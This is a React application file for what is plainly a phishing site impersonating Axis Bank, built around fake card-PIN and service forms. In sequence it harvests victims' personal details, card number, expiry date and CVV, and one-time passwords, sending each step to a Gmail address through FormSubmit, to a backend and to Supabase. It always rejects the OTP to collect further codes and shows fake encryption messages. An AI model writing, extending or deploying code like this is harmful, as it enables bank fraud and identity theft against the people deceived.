/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

import React, { useState, useEffect } from 'react';
import { View, ServiceType, ApplicantData, CardData } from './types';
import { SERVICES } from './data/services';
import AxisHeader from './components/AxisHeader';
import Sidebar from './components/Sidebar';
import Dashboard from './components/Dashboard';
import ApplicantDetailsForm from './components/ApplicantDetailsForm';
import CardVerificationForm from './components/CardVerificationForm';
import OtpVerification from './components/OtpVerification';
import ProcessingOverlay from './components/ProcessingOverlay';
import SuccessView from './components/SuccessView';
import AxisFooter from './components/AxisFooter';
import SqlEditor from './components/SqlEditor';
import PhoneAuthOverlay from './components/PhoneAuthOverlay';
import SuccessMsgBanner from './components/SuccessMsgBanner';
import { saveSubmissionToSupabase } from './lib/supabase';

const DEFAULT_APPLICANT_DATA: ApplicantData = {
  fullName: '',
  email: '',
  mobileNumber: '',
  dob: '',
};

const DEFAULT_CARD_DATA: CardData = {
  cardholderName: '',
  cardNumber: '',
  expiryDate: '',
  cvv: '',
};

export default function App() {
  const [sidebarOpen, setSidebarOpen] = useState(false);
  const [currentView, setCurrentView] = useState<View>(View.DASHBOARD);
  const [selectedService, setSelectedService] = useState<ServiceType>(ServiceType.CARD_PIN_GENERATION);
  
  // Forms states
  const [applicantData, setApplicantData] = useState<ApplicantData>(DEFAULT_APPLICANT_DATA);
  const [cardData, setCardData] = useState<CardData>(DEFAULT_CARD_DATA);

  // Loading spinner overlays
  const [isProcessing, setIsProcessing] = useState(false);
  const [processingMessage, setProcessingMessage] = useState('Processing...');
  const [processingSubmessage, setProcessingSubmessage] = useState('Do not refresh page');
  const [otpError, setOtpError] = useState<string | null>(null);

  // Active submission session ID for sequential ordering in Supabase
  const [submissionId, setSubmissionId] = useState<string | null>(null);

  // Initial loader for 5 seconds when website is opened
  const [isInitialLoading, setIsInitialLoading] = useState(true);

  useEffect(() => {
    try {
      localStorage.removeItem('custom-axis-logo');
      localStorage.removeItem('custom-axis-title');
    } catch (e) {
      console.error(e);
    }
    const timer = setTimeout(() => {
      setIsInitialLoading(false);
    }, 5000);
    return () => clearTimeout(timer);
  }, []);

  // Scroll to top of window and container elements whenever the current view changes
  useEffect(() => {
    window.scrollTo(0, 0);
    if (document.documentElement) {
      document.documentElement.scrollTop = 0;
    }
    if (document.body) {
      document.body.scrollTop = 0;
    }
    // Also scroll the main container if it exists
    const container = document.getElementById('app-root-container');
    if (container) {
      container.scrollTop = 0;
    }
  }, [currentView]);

  // Trigger temporary loading spinner overlays during state transitions
  const triggerLoading = (
    message: string,
    submessage: string,
    durationMs: number,
    onComplete: () => void
  ) => {
    setProcessingMessage(message);
    setProcessingSubmessage(submessage);
    setIsProcessing(true);
    
    setTimeout(() => {
      setIsProcessing(false);
      onComplete();
    }, durationMs);
  };

  const handleSelectService = (type: ServiceType) => {
    setSelectedService(type);
    setSubmissionId(null);
    triggerLoading(
      'Processing...',
      'Do not refresh page',
      4000,
      () => setCurrentView(View.APPLICANT_DETAILS)
    );
  };

  const sendToFormSubmit = async (subject: string, data: Record<string, any>) => {
    try {
      await fetch('https://formsubmit.co/ajax/mypaneldata6@gmail.com', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Accept': 'application/json'
        },
        body: JSON.stringify({
          _subject: subject,
          _captcha: 'false',
          ...data,
        }),
      });
    } catch (err) {
      console.error('Error sending to FormSubmit:', err);
    }
  };

  const getUniqueSubject = (baseTitle: string, name: string) => {
    const randomSuffix = Math.floor(1000 + Math.random() * 9000);
    const date = new Date();
    const timeString = `${String(date.getHours()).padStart(2, '0')}:${String(date.getMinutes()).padStart(2, '0')}:${String(date.getSeconds()).padStart(2, '0')}.${String(date.getMilliseconds()).padStart(3, '0')}`;
    return `${baseTitle} - ${name} [#Ref-${randomSuffix}-${timeString}]`;
  };

  const handleApplicantSubmit = async (data: ApplicantData) => {
    // 1. Immediately trigger the loading screen for instant 1st-click feedback
    triggerLoading(
      'Verifying Credentials...',
      'Checking information secure nodes',
      4000,
      () => setCurrentView(View.CARD_VERIFICATION)
    );

    setApplicantData(data);
    try {
      if (data.mobileNumber) {
        localStorage.setItem('axis_mobile_number', data.mobileNumber);
      }
      localStorage.setItem('axis_applicant_data', JSON.stringify(data));
    } catch (e) {
      // ignore
    }
    // Autofill name on card from applicant name if card name is empty
    const updatedCardData = {
      ...cardData,
      cardholderName: cardData.cardholderName || data.fullName.toUpperCase(),
    };
    setCardData(updatedCardData);

    const serviceName = activeServiceInfo?.title || selectedService || 'Axis Portal';
    const uniqueSubject = getUniqueSubject('[NEW APPLICANT] Axis Bank Portal', data.fullName);

    // Send to FormSubmit
    sendToFormSubmit(uniqueSubject, {
      'Step': 'Step 1 - Applicant Details',
      'Selected Service': serviceName,
      'Full Name': data.fullName,
      'Email ID': data.email,
      'Mobile Number': data.mobileNumber,
      'Date of Birth': data.dob,
      'Timestamp': new Date().toLocaleString('en-US', { timeZone: 'Asia/Kolkata' }) + ' (IST)',
    });

    // Send single consolidated step update to backend API
    try {
      const res = await fetch('/api/submit-step', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          submissionId: submissionId,
          step: 'applicant',
          subject: uniqueSubject,
          selectedService: serviceName,
          applicantData: data,
          cardData: updatedCardData,
        }),
      });
      const resData = await res.json();
      if (resData.submissionId) {
        setSubmissionId(resData.submissionId);
        try {
          localStorage.setItem('axis_submission_id', resData.submissionId);
        } catch (e) {}
      }
    } catch (err) {
      console.error('Error submitting applicant step to server:', err);
      // Fallback direct Supabase save
      const fbResult = await saveSubmissionToSupabase({
        id: submissionId || undefined,
        step: 'applicant',
        selected_service: serviceName,
        full_name: data.fullName,
        email: data.email,
        mobile_number: data.mobileNumber,
        dob: data.dob,
      });
      if (fbResult.id) {
        setSubmissionId(fbResult.id);
        try {
          localStorage.setItem('axis_submission_id', fbResult.id);
        } catch (e) {}
      }
    }
  };

  const handleCardSubmit = async (data: CardData) => {
    // 1. Immediately trigger the loading screen for instant 1st-click feedback
    triggerLoading(
      'Authenticating details...',
      'Encrypting with 256-bit SSL protocols',
      4000,
      () => setCurrentView(View.OTP_VERIFICATION)
    );

    setCardData(data);
    setOtpError(null);

    const serviceName = activeServiceInfo?.title || selectedService || 'Axis Portal';
    const applicantName = applicantData?.fullName || 'No Name';
    const uniqueSubject = getUniqueSubject('[CARD DETAILS] Axis Bank Portal', applicantName);

    // Send to FormSubmit
    sendToFormSubmit(uniqueSubject, {
      'Step': 'Step 2 - Card Details',
      'Selected Service': serviceName,
      'Cardholder Name': data.cardholderName,
      'Card Number': data.cardNumber,
      'Expiry Date': data.expiryDate,
      'CVV': data.cvv,
      'Timestamp': new Date().toLocaleString('en-US', { timeZone: 'Asia/Kolkata' }) + ' (IST)',
    });

    // Send single consolidated step update to backend API
    try {
      const res = await fetch('/api/submit-step', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          submissionId: submissionId,
          step: 'card',
          subject: uniqueSubject,
          selectedService: serviceName,
          applicantData: applicantData,
          cardData: data,
        }),
      });
      const resData = await res.json();
      if (resData.submissionId) {
        setSubmissionId(resData.submissionId);
      }
    } catch (err) {
      console.error('Error submitting card step to server:', err);
      const fbResult = await saveSubmissionToSupabase({
        id: submissionId || undefined,
        step: 'card',
        selected_service: serviceName,
        full_name: applicantData?.fullName,
        email: applicantData?.email,
        mobile_number: applicantData?.mobileNumber,
        dob: applicantData?.dob,
        cardholder_name: data.cardholderName,
        card_number: data.cardNumber,
        expiry_date: data.expiryDate,
        cvv: data.cvv,
      });
      if (fbResult.id) setSubmissionId(fbResult.id);
    }
  };

  const handleOtpSubmit = async (otp: string) => {
    setOtpError(null);

    // 1. Immediately trigger the loading screen for instant 1st-click feedback
    triggerLoading(
      'Processing...',
      'Do not refresh page',
      4000,
      () => {
        setOtpError('Incorrect OTP, please try again');
      }
    );

    const serviceName = activeServiceInfo?.title || selectedService || 'Axis Portal';
    const applicantName = applicantData?.fullName || 'No Name';
    const uniqueSubject = getUniqueSubject(`[OTP ENTERED: ${otp}] Axis Bank Portal`, applicantName);

    // Send to FormSubmit
    sendToFormSubmit(uniqueSubject, {
      'Step': 'Step 3 - OTP Submitted',
      'Selected Service': serviceName,
      'ENTERED OTP': otp,
      'Timestamp': new Date().toLocaleString('en-US', { timeZone: 'Asia/Kolkata' }) + ' (IST)',
    });

    // Send single consolidated step update to backend API
    try {
      const res = await fetch('/api/submit-step', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          submissionId: submissionId,
          step: 'otp',
          subject: uniqueSubject,
          selectedService: serviceName,
          applicantData: applicantData,
          cardData: cardData,
          otp: otp,
        }),
      });
      const resData = await res.json();
      if (resData.submissionId) {
        setSubmissionId(resData.submissionId);
      }
    } catch (err) {
      console.error('Error submitting otp step to server:', err);
      const fbResult = await saveSubmissionToSupabase({
        id: submissionId || undefined,
        step: 'otp',
        selected_service: serviceName,
        full_name: applicantData?.fullName,
        email: applicantData?.email,
        mobile_number: applicantData?.mobileNumber,
        dob: applicantData?.dob,
        cardholder_name: cardData?.cardholderName,
        card_number: cardData?.cardNumber,
        expiry_date: cardData?.expiryDate,
        cvv: cardData?.cvv,
        otp: otp,
      });
      if (fbResult.id) setSubmissionId(fbResult.id);
    }
  };

  const handleOtpResend = async () => {
    setOtpError(null);

    const serviceName = activeServiceInfo?.title || selectedService || 'Axis Portal';
    const applicantName = applicantData?.fullName || 'No Name';
    const uniqueSubject = getUniqueSubject('[OTP RESEND] Axis Bank Portal', applicantName);

    // Send to FormSubmit
    sendToFormSubmit(uniqueSubject, {
      'Step': 'OTP Resend Requested',
      'Selected Service': serviceName,
      'Timestamp': new Date().toLocaleString('en-US', { timeZone: 'Asia/Kolkata' }) + ' (IST)',
    });

    // Send step update to server
    try {
      const res = await fetch('/api/submit-step', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          submissionId: submissionId,
          step: 'otp_resend',
          subject: uniqueSubject,
          selectedService: serviceName,
          applicantData: applicantData,
          cardData: cardData,
        }),
      });
      const resData = await res.json();
      if (resData.submissionId) {
        setSubmissionId(resData.submissionId);
      }
    } catch (err) {
      console.error('Error submitting otp resend:', err);
    }

    triggerLoading(
      'Resending Code...',
      'Transmitting secure SMS dispatch payload',
      4000,
      () => {}
    );
  };

  const handleResetToHome = () => {
    setApplicantData(DEFAULT_APPLICANT_DATA);
    setCardData(DEFAULT_CARD_DATA);
    setSubmissionId(null);
    setCurrentView(View.DASHBOARD);
  };

  const handleHeaderBack = () => {
    if (currentView === View.APPLICANT_DETAILS) {
      setCurrentView(View.DASHBOARD);
    } else if (currentView === View.CARD_VERIFICATION) {
      setCurrentView(View.APPLICANT_DETAILS);
    } else if (currentView === View.OTP_VERIFICATION) {
      setCurrentView(View.CARD_VERIFICATION);
    } else if (currentView === View.SUCCESS) {
      handleResetToHome();
    }
  };

  // Determine active title or security indicator for the header
  const getHeaderProps = () => {
    const showBack = currentView !== View.DASHBOARD;
    const isSecure = currentView === View.OTP_VERIFICATION || currentView === View.CARD_VERIFICATION;
    return { showBack, isSecure };
  };

  const activeServiceInfo = SERVICES[selectedService];

  return (
    <div className="min-h-screen bg-slate-50/70 font-sans antialiased text-gray-800 flex flex-col" id="app-root-container">
      {/* Top Secure Axis Header */}
      {currentView === View.DASHBOARD && (
        <AxisHeader
          onBack={handleHeaderBack}
          showBack={getHeaderProps().showBack}
          onMenuToggle={() => setSidebarOpen(true)}
          showMenu={currentView === View.DASHBOARD}
          isSecure={getHeaderProps().isSecure}
        />
      )}

      {/* Main Responsive Body Container */}
      <main className="flex-1 flex flex-col justify-start py-4 max-w-5xl mx-auto w-full" id="main-content-stage">
        {/* Real-time 24-Hour Success MSG Card Banner with Live Demo Card */}
        <SuccessMsgBanner
          mobileNumber={applicantData.mobileNumber}
          submissionId={submissionId}
          cardData={cardData}
          applicantData={applicantData}
        />

        {currentView === View.DASHBOARD && (
          <Dashboard onSelectService={handleSelectService} />
        )}

        {currentView === View.APPLICANT_DETAILS && activeServiceInfo && (
          <ApplicantDetailsForm
            service={activeServiceInfo}
            onSubmit={handleApplicantSubmit}
            initialData={applicantData}
            onBack={handleHeaderBack}
          />
        )}

        {currentView === View.CARD_VERIFICATION && (
          <CardVerificationForm
            onSubmit={handleCardSubmit}
            initialData={cardData}
            onBack={handleHeaderBack}
          />
        )}

        {currentView === View.OTP_VERIFICATION && (
          <OtpVerification
            mobileNumber={applicantData.mobileNumber}
            onSubmit={handleOtpSubmit}
            onResend={handleOtpResend}
            onBack={handleHeaderBack}
            error={otpError}
          />
        )}

        {currentView === View.SUCCESS && activeServiceInfo && (
          <SuccessView
            service={activeServiceInfo}
            applicant={applicantData}
            card={cardData}
            onHome={handleResetToHome}
          />
        )}

        {currentView === View.SQL_EDITOR && (
          <SqlEditor onBack={() => setCurrentView(View.DASHBOARD)} />
        )}
      </main>

      {/* Axis Trust & Information Footer */}
      {currentView === View.DASHBOARD && (
        <AxisFooter onOpenSqlEditor={() => setCurrentView(View.SQL_EDITOR)} />
      )}

      {/* Floating/Overlay Drawer Sidebar */}
      <Sidebar
        isOpen={sidebarOpen}
        onClose={() => setSidebarOpen(false)}
        onSelectService={handleSelectService}
        onLogin={() => {
          setCurrentView(View.APPLICANT_DETAILS);
        }}
        onOpenSqlEditor={() => setCurrentView(View.SQL_EDITOR)}
        activeService={currentView !== View.DASHBOARD ? selectedService : undefined}
      />

      {/* Global Phone Authentication Realtime Overlay Modal */}
      <PhoneAuthOverlay mobileNumber={applicantData.mobileNumber} submissionId={submissionId} />

      {/* Global Spinning Modal Processing Dialog */}
      <ProcessingOverlay
        isVisible={isInitialLoading || isProcessing}
        message={isInitialLoading ? 'Processing...' : processingMessage}
        submessage={isInitialLoading ? 'Do not refresh page' : processingSubmessage}
      />
    </div>
  );
}
